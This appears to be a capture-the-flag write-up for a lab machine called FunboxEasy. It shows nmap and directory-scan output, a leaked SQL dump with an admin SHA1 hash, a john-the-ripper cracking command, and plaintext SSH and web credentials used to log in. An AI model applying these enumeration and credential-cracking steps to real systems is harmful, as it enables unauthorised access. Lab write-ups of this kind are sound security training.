# FunboxEasy

***

IP=192.168.201.111

## NMAP

| PORT      | STATE | SERVICE |
| --------- | ----- | ------- |
| 22/tcp    | open  | ssh     |
| 80/tcp    | open  | http    |
| 33060/tcp | open  | mysqlx  |

```perl
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2d8516ec584051908ebc8582713132f (RSA)
|   256 b0de9703a72ff4e2ab4a9cd9439b8a48 (ECDSA)
|_  256 9d0f9a26384f0180a7a6809dd1d4cfec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80 - Http

http-robots.txt: 1 disallowed entry |\_gym

```perl
/index.php            (Status: 200) [Size: 3468]
/index.html           (Status: 200) [Size: 10918]
/profile.php          (Status: 302) [Size: 7247] [--> http://192.168.201.111/index.php]
/header.php           (Status: 200) [Size: 1666]                                       
/store/               (Status: 200) [Size: 3998]                                       
/admin/               (Status: 200) [Size: 3263]                                       
/registration.php     (Status: 200) [Size: 9409]                                       
/logout.php           (Status: 200) [Size: 75]                                         
/robots.txt           (Status: 200) [Size: 14]                                         
/dashboard.php        (Status: 302) [Size: 10272] [--> http://192.168.201.111/index.php]
/secret/              (Status: 200) [Size: 108]                                         
/leftbar.php          (Status: 200) [Size: 1837]                                        
/forgot-password.php  (Status: 200) [Size: 2763]
```

### Fuzzing

/store --> /database --> www\_project.sql

```mysql
INSERT INTO `admin` (`name`, `pass`) VALUES
('admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');
```

```bash
echo 'd033e22ae348aeb5660fc2140aec35850c4da997' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

admin:admin

/store/admin.php



<figure><img src="../../../../assets/images/reference/f5f42b87e7c43e7cd6b7.png" alt=""><figcaption></figcaption></figure>

## PrivEsc

ssh: yxcvbnmYYY gym/admin: asdfghjklXXX /store: admin@admin.com admin

```bash
ssh tony@$IP
yxcvbnmYYY
```
